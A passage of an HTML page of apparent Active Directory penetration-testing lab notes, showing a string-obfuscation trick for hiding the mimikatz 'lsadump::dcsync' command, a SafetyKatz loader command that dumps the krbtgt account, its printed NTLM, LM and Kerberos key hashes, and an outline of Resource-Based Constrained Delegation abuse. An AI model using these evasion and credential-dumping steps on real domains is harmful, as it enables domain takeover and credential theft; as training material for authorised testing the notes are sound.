integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80c3-88ae-ea30bd9936f7" class="code code-wrap"><code class="language-PowerShell">[!] Argument Limit: 180 characters
+[+] Enter a string: lsadump::dcsync
+set &quot;z=c&quot;
+set &quot;y=n&quot;
+set &quot;x=y&quot;
+set &quot;w=s&quot;
+set &quot;v=c&quot;
+set &quot;u=d&quot;
+set &quot;t=:&quot;
+set &quot;s=:&quot;
+set &quot;r=p&quot;
+set &quot;q=m&quot;
+set &quot;p=u&quot;
+set &quot;o=d&quot;
+set &quot;n=a&quot;
+set &quot;m=s&quot;
+set &quot;l=l&quot;
+set &quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c2-bf32-c2368efbf249" class="">Once we have encoded the payload <code>lsadump::dcsync</code> then we can execute SafetyKatz to request any domain secrets.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801a-b8fc-c9e26c5b712a" class=""><code>C:\AD\Tools&gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args &quot;%Pwn% /user:dcorp\krbtgt&quot; &quot;exit”</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-803d-b50c-f82e4890b22d" class="code code-wrap"><code class="language-PowerShell">mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
+[DC] &#x27;dollarcorp.moneycorp.local&#x27; will be the domain
+[DC] &#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27; will be the DC server
+[DC] &#x27;dcorp\krbtgt&#x27; will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 10:59:41 PM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
+    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
+    lm  - 0: ea03581a1268674a828bde6ab09db837
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
+      des_cbc_md5       (4096) : 150ea2e934ab6b80
+
+* Primary:Kerberos *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 150ea2e934ab6b80</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-803b-b15f-d8b7b07c3c9e" class="bulleted-list"><li><strong>Resource-Based Constrained Delegation (RBCD)</strong><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8001-b108-c3c9d8f3d249" class="">Resource-Based Constrained Delegation (RBCD)</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80db-87dc-dfc251cc355b" class="">Resource-Based Constrained Delegation (RBCD) is a feature in Windows Server 2012 that allows resources to configure which accounts are trusted to delegate to them. This is different from classic constrained delegation, which is configured on the account itself.</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-80f1-bc98-d1b46c375b86" class="">Key Features</h3></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8009-998e-e1f02a0128d6" class="numbered-list" start="1"><li><strong>msDS-AllowedToActOnBehalfOfOtherIdentity Attribute</strong>: RBCD uses this attribute to store a security descriptor for the object that can access the resource. This attribute controls resource-based delegation.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-805d-a6dc-feb135ca7aff" class="numbered-list" start="2"><li><strong>Security</strong>: RBCD is considered more secure than classic constrained delegation because it provides authentication support for across-domain service solutions using an existing Kerberos infrastructure without the need for unconstrained delegation.</li></ol></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8064-b4ce-f9e62c6a9bb7" class="">Abuse Scenarios</h3></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-80d9-8953-d8b3d92f90ce" class="numbered-list" start="1"><li><strong>Creating a Computer Object</strong>: An attacker can create a new computer account using PowerMad, which is allowed due to the default MachineAccountQuota value. <br/>This allows them to set the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute to contain a security descriptor with the computer account they control.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8012-817e-d1eb66218e41" class="numbered-list" start="2"><li><strong>Write Permissions</strong>: The attacker needs write permission over the target computer to set the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8033-b237-dcb11c84685c" class="numbered-list" start="3"><li><strong>SPN Configuration</strong>: The attacker needs control over an object that has SPN configured or the ability to add a new machine account to the domain.</li></ol></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8049-9089-fab96a7d501a" class="">Comparison with Constrained Delegation</h3></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-800e-af5d-fb0b29ec09be" class="numbered-list" start="1"><li><strong>Configuration</strong>: Constrained delegation is configured on the account itself, while RBCD is configured on the resource or computer account.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8094-a38d-fc39fec4aed3" class="numbered-list" start="2"><li><strong>msDS-AllowedToDelegateTo and msDS-AllowedToActOnBehalfOfOtherIdentity Attributes</strong>: Constrained delegation uses <code>msDS-AllowedToDelegateTo</code> to store a list of target services that a service configured for delegation can access as another user. RBCD uses <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> to store a list of services that can access a target service as another user.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="30c79e9a-d7c9-8075-a3ad-e96111e119eb" class="numbered-list" start="3"><li><strong>Security</strong>: RBCD is considered more secure than classic constrained delegation because it provides authentication support for across-domain service solutions using an existing Kerberos infrastructure without the need for unconstrained delegation.</li></ol></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto">
+        </section>
+      </article>
+    </div>
+
+    <script src="../assets/js/script.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg2.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  </body>
+</html>
